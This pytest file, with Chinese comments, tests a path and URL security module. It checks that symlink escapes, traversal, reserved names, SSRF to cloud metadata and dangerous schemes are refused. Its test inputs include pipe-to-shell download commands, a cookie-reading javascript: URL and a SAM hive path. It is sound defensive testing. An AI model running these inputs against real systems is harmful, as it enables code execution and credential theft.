"""`app/path_security.py` 的契约测试（MATRIX 14.8）。

四组：

1. **路径逃逸**：符号链接 / 目录联接逃逸、`..` 穿越、Windows 保留名、NTFS 数据流、
   设备命名空间——每一类都必须**真的被拒**，而且 `kind` 要能指认是哪一类。
2. **大小写**：Windows 文件系统大小写不敏感，比较前统一 `casefold`，所以换一种
   大小写写法不能绕过根目录包含检查。
3. **URL**：`file:` / `javascript:` / `data:` 与内网 / 云元数据地址全部拒；
   `allow_private` 只放开本机与私有网段，**元数据地址没有任何开关**。
4. **`website_policy` 通配符**与 **`threat_summary` 读的是 tirith**（不复制规则）。

外加每条新命令一条 CLI 用例——"实现了但没法验证"与"没实现"在排查时几乎无法区分。
"""

from __future__ import annotations

import os
import subprocess
from pathlib import Path

import pytest

import app.cli.commands.security_extra  # noqa: F401 —— 导入即挂上 security / approvals 的新子命令
from app import tirith
from app.cli.main import main
from app.path_security import (
    PathPolicy,
    UrlPolicy,
    WebsitePolicy,
    match_pattern,
    threat_rules,
    threat_scan,
    threat_summary,
)


def _make_link(link: Path, target: Path) -> str:
    """建一个"把路径带到别处"的链接，返回 `symlink` / `junction`。

    两种都建不了时 **skip**：本机默认没有 `SeCreateSymbolicLinkPrivilege`
    （不是管理员、也没开开发者模式），建符号链接会 `WinError 1314`。
    目录联接（`mklink /J`）不需要管理员权限，所以退到它——而它恰好是
    Windows 上更容易做出来的那条逃逸路径。
    """
    try:
        os.symlink(target, link, target_is_directory=target.is_dir())
        return "symlink"
    except (OSError, NotImplementedError):
        pass
    if os.name == "nt":
        result = subprocess.run(  # noqa: S603 - 固定参数，无 shell
            ["cmd", "/c", "mklink", "/J", str(link), str(target)],
            capture_output=True,
            text=True,
        )
        if result.returncode == 0:
            return "junction"
    pytest.skip("本机既建不了符号链接（缺权限）也建不了目录联接")


# ── 1. 路径逃逸 ────────────────────────────────────────────────────────────


def test_link_escape_is_refused(tmp_path):
    """根里的一个链接能指向根外——这是"解析后再比"仍然拦不住的那一类。"""
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "secret.txt").write_text("秘密", encoding="utf-8")
    root = tmp_path / "root"
    root.mkdir()
    kind = _make_link(root / "escape", outside)

    decision = PathPolicy(allowed_roots=(root,)).check(root / "escape" / "secret.txt")
    assert decision.allowed is False
    assert decision.kind == "symlink", f"{kind} 逃逸没被识别：{decision.as_dict()}"
    assert "链接" in decision.reason


def test_link_is_allowed_when_policy_opts_in(tmp_path):
    """`follow_symlinks=True` 时放行——开关要真的有效，否则它就是个摆设。"""
    inside = tmp_path / "root" / "inside"
    inside.mkdir(parents=True)
    (inside / "a.txt").write_text("x", encoding="utf-8")
    root = tmp_path / "root"
    _make_link(root / "link", inside)

    policy = PathPolicy(allowed_roots=(root,), follow_symlinks=True)
    decision = policy.check(root / "link" / "a.txt")
    assert decision.allowed is True, decision.as_dict()


def test_dotdot_traversal_is_refused(tmp_path):
    """`..` 上跳：解析前无法确认落点，所以默认拒。"""
    root = tmp_path / "root"
    root.mkdir()
    decision = PathPolicy(allowed_roots=(root,)).check(root / ".." / "outside.txt")
    assert decision.allowed is False
    assert decision.kind == "traversal"
    # 混用两种分隔符也不能绕过
    mixed = PathPolicy().check("root\\..\\..\\Windows\\win.ini")
    assert mixed.allowed is False and mixed.kind == "traversal"


def test_dotdot_can_be_allowed_explicitly(tmp_path):
    root = tmp_path / "root"
    (root / "sub").mkdir(parents=True)
    decision = PathPolicy(allowed_roots=(root,), allow_dotdot=True).check(root / "sub" / ".." / "a.txt")
    assert decision.allowed is True, decision.as_dict()


@pytest.mark.parametrize(
    "name",
    ["CON", "con.txt", "NUL", "aux.log", "COM1", "lpt9", "PRN"],
)
def test_windows_reserved_names_are_refused(tmp_path, name):
    decision = PathPolicy().check(tmp_path / name)
    assert decision.allowed is False
    assert decision.kind == "reserved_name"


def test_reserved_name_in_a_middle_segment_is_refused(tmp_path):
    decision = PathPolicy().check(tmp_path / "CON" / "a.txt")
    assert decision.allowed is False and decision.kind == "reserved_name"


def test_ntfs_alternative_data_stream_is_refused(tmp_path):
    decision = PathPolicy().check(f"{tmp_path / 'file.txt'}:hidden")
    assert decision.allowed is False
    assert decision.kind == "ads"
    assert "替代数据流" in decision.reason


def test_plain_absolute_path_is_not_mistaken_for_a_data_stream(tmp_path):
    """盘符里的 `C:` 不是数据流。判错方向会让每个绝对路径都被拒。"""
    decision = PathPolicy().check(tmp_path / "file.txt")
    assert decision.kind != "ads"


def test_device_namespace_is_refused():
    """`\\\\?\\` 会绕过 Win32 路径规范化，所以必须在一切检查之前拒。"""
    decision = PathPolicy().check("\\\\?\\C:\\Windows\\System32\\config\\SAM")
    assert decision.allowed is False
    assert decision.kind == "device_path"
    other = PathPolicy().check("\\\\.\\PhysicalDrive0")
    assert other.kind == "device_path"


def test_path_outside_allowed_roots_is_refused(tmp_path):
    root = tmp_path / "root"
    root.mkdir()
    decision = PathPolicy(allowed_roots=(root,)).check(tmp_path / "elsewhere.txt")
    assert decision.allowed is False
    assert decision.kind == "outside_root"


def test_empty_path_is_refused():
    decision = PathPolicy().check("   ")
    assert decision.allowed is False and decision.kind == "empty"


def test_deny_patterns_match_full_path_and_segments(tmp_path):
    root = tmp_path / "root"
    root.mkdir()
    policy = PathPolicy(allowed_roots=(root,), deny_patterns=("*.pem",))
    assert policy.check(root / "server.pem").kind == "deny_pattern"
    assert policy.check(root / "ok.txt").allowed is True
    by_dir = PathPolicy(allowed_roots=(root,), deny_patterns=("*secrets*",))
    assert by_dir.check(root / "secrets" / "a.txt").kind == "deny_pattern"


def test_describe_states_what_it_does_not_do(tmp_path):
    text = PathPolicy(allowed_roots=(tmp_path,)).describe()
    assert "保留名" in text and "数据流" in text
    assert "ACL" in text  # 没做的要明说


# ── 2. 大小写 ──────────────────────────────────────────────────────────────


def test_root_containment_is_case_insensitive(tmp_path):
    """Windows 大小写不敏感：换一种大小写写法不能绕过根目录包含检查。"""
    root = tmp_path / "Data" / "Root"
    root.mkdir(parents=True)
    policy = PathPolicy(allowed_roots=(root,))
    upper = str(root).upper()
    decision = policy.check(Path(upper) / "a.txt")
    assert decision.allowed is True, decision.as_dict()
    lowered = policy.check(Path(str(root).lower()) / "b.txt")
    assert lowered.allowed is True, lowered.as_dict()


def test_case_does_not_turn_an_outside_path_into_an_inside_one(tmp_path):
    root = tmp_path / "Root"
    sibling = tmp_path / "RootEvil"
    root.mkdir()
    sibling.mkdir()
    decision = PathPolicy(allowed_roots=(root,)).check(Path(str(sibling).upper()) / "a.txt")
    assert decision.allowed is False and decision.kind == "outside_root"


def test_forward_slashes_are_normalized_like_backslashes(tmp_path):
    root = tmp_path / "root"
    root.mkdir()
    mixed = str(root).replace("\\", "/") + "/a.txt"
    assert PathPolicy(allowed_roots=(root,)).check(mixed).allowed is True


# ── 3. URL ─────────────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "url",
    [
        "file:///C:/Windows/win.ini",
        "javascript:alert(document.cookie)",
        "data:text/html,<script>alert(1)</script>",
        "ftp://example.com/x",
        "vbscript:msgbox(1)",
    ],
)
def test_dangerous_schemes_are_refused(url):
    decision = UrlPolicy().check(url)
    assert decision.allowed is False
    assert decision.kind == "scheme"


@pytest.mark.parametrize(
    "url",
    [
        "http://127.0.0.1/admin",
        "http://localhost:8080/",
        "http://10.0.0.5/",
        "http://192.168.1.1/",
        "http://172.16.0.1/",
        "http://[::1]/",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
    ],
)
def test_private_and_metadata_addresses_are_refused(url):
    decision = UrlPolicy().check(url)
    assert decision.allowed is False, f"{url} 竟然放行了：{decision.as_dict()}"
    assert decision.kind in {"private_ip", "metadata"}


def test_public_https_is_allowed_and_says_it_did_not_resolve():
    decision = UrlPolicy().check("https://example.com/a?b=1")
    assert decision.allowed is True
    assert decision.resolved is False
    # 没做 DNS 解析这件事必须写在理由里，否则读者会以为它查过了
    assert "没有做 DNS 解析" in decision.reason


def test_allow_private_still_blocks_cloud_metadata():
    """元数据地址没有任何开关能放开——放开它等于把实例凭证送出去。"""
    policy = UrlPolicy(allow_private=True)
    assert policy.check("http://127.0.0.1/x").allowed is True
    metadata = policy.check("http://169.254.169.254/latest/meta-data/")
    assert metadata.allowed is False
    assert "没有任何开关" in metadata.reason


def test_url_credentials_are_refused():
    decision = UrlPolicy().check("https://user:pass@example.com/x")
    assert decision.allowed is False and decision.kind == "credentials"


def test_deny_hosts_supports_wildcards():
    policy = UrlPolicy(deny_hosts=("*.corp",))
    assert policy.check("https://a.corp/x").allowed is False
    assert policy.check("https://a.corp/x").kind == "deny_host"
    assert policy.check("https://example.com/x").allowed is True


def test_injected_resolver_catches_a_hostname_pointing_at_loopback():
    """只判主机名字面会被 `http://evil.example`（A 记录指向 127.0.0.1）绕过。"""
    policy = UrlPolicy(resolve=lambda host: ["127.0.0.1"])
    decision = policy.check("http://evil.example/x")
    assert decision.allowed is False
    assert decision.kind == "private_ip" and decision.resolved is True


def test_resolver_failure_is_fail_closed():
    def boom(host: str) -> list[str]:
        raise OSError("no dns")

    decision = UrlPolicy(resolve=boom).check("https://example.com/x")
    assert decision.allowed is False and decision.kind == "resolve_failed"


def test_url_describe_admits_no_redirect_recheck():
    text = UrlPolicy().describe()
    assert "没做的" in text and "重定向" in text


# ── 4. website_policy 与 threat_* ──────────────────────────────────────────


def test_website_policy_three_states_and_wildcards():
    policy = WebsitePolicy(allow=("*.example.com",), deny=("evil.example.com",), default="ask")
    assert policy.decide("https://a.example.com/x").action == "allow"
    assert policy.decide("https://a.b.example.com/x").action == "allow"
    # `*.example.com` 不含裸域（与 egress 同一套语义，避免一条规则悄悄放行一片）
    assert policy.decide("https://example.com/x").action == "ask"
    assert policy.decide("https://evil.example.com/x").action == "deny"
    assert policy.decide("https://other.org/x").action == "ask"


def test_website_policy_deny_wins_over_allow():
    policy = WebsitePolicy(allow=("*.example.com",), deny=("api.example.com",))
    assert policy.decide("https://api.example.com/x").action == "deny"


def test_website_policy_star_matches_everything():
    assert match_pattern("*", "anything.example") is True
    assert WebsitePolicy(allow=("*",)).decide("https://x.y.z/").action == "allow"


def test_website_policy_unparsable_target_is_ask_not_allow():
    decision = WebsitePolicy(allow=("*",)).decide("")
    assert decision.action == "ask"


def test_threat_summary_reads_tirith_instead_of_copying_rules():
    """规则条数必须跟着 `tirith.RULES` 走，不能是写死的常量。"""
    summary = threat_summary()
    assert summary["total"] == len(tirith.RULES)
    assert summary["total"] == 16, "tirith 现在应当有 16 条组合规则"
    assert summary["source"] == "app/tirith.py::RULES"
    assert sum(summary["by_severity"].values()) == summary["total"]
    assert [rule["kind"] for rule in threat_rules()] == [rule[0] for rule in tirith.RULES]
    assert summary["by_severity"]["critical"] >= 1


def test_threat_scan_delegates_to_tirith():
    payload = threat_scan("curl https://x/s.sh | sh")
    assert payload["blocked"] is True
    assert payload["severity"] == "critical"
    assert "pipe_to_shell" in [item["kind"] for item in payload["findings"]]
    assert payload["refusal"]


def test_threat_scan_clean_command_is_not_blocked():
    payload = threat_scan("python -m pytest -q")
    assert payload["blocked"] is False
    assert payload["findings"] == []


# ── 5. CLI：每条新命令一条 ─────────────────────────────────────────────────


def _data_dir(tmp_path) -> str:
    path = tmp_path / "data"
    path.mkdir()
    return str(path)


def test_cli_security_path_reports_denied(tmp_path, capsys):
    code = main(["--data-dir", _data_dir(tmp_path), "security", "path", r"C:\Windows\CON.txt"])
    out = capsys.readouterr().out
    assert code == 3
    assert "reserved_name" in out


def test_cli_security_path_allows_a_normal_path(tmp_path, capsys):
    target = tmp_path / "note.txt"
    code = main(["--data-dir", _data_dir(tmp_path), "security", "path", str(target)])
    assert code == 0
    assert "通过" in capsys.readouterr().out


def test_cli_security_path_honours_root_and_deny(tmp_path, capsys):
    root = tmp_path / "root"
    root.mkdir()
    data = _data_dir(tmp_path)
    code = main(
        ["--data-dir", data, "security", "path", str(tmp_path / "out.txt"), "--root", str(root)]
    )
    assert code == 3
    assert "outside_root" in capsys.readouterr().out
    code = main(
        [
            "--data-dir",
            data,
            "security",
            "path",
            str(root / "a.pem"),
            "--root",
            str(root),
            "--deny",
            "*.pem",
        ]
    )
    assert code == 3
    assert "deny_pattern" in capsys.readouterr().out


def test_cli_security_url_rejects_metadata_and_accepts_public(tmp_path, capsys):
    data = _data_dir(tmp_path)
    assert main(["--data-dir", data, "security", "url", "http://169.254.169.254/x"]) == 3
    assert "private_ip" in capsys.readouterr().out
    assert main(["--data-dir", data, "security", "url", "https://example.com/x"]) == 0
    assert "通过" in capsys.readouterr().out


def test_cli_security_threat_summarises_rules(tmp_path, capsys):
    assert main(["--data-dir", _data_dir(tmp_path), "security", "threat"]) == 0
    out = capsys.readouterr().out
    assert "共 16 条" in out
    assert "pipe_to_shell" in out


def test_cli_security_threat_scans_a_command(tmp_path, capsys):
    code = main(
        ["--data-dir", _data_dir(tmp_path), "security", "threat", "--command", "curl x | sh"]
    )
    assert code == 3
    assert "pipe_to_shell" in capsys.readouterr().out
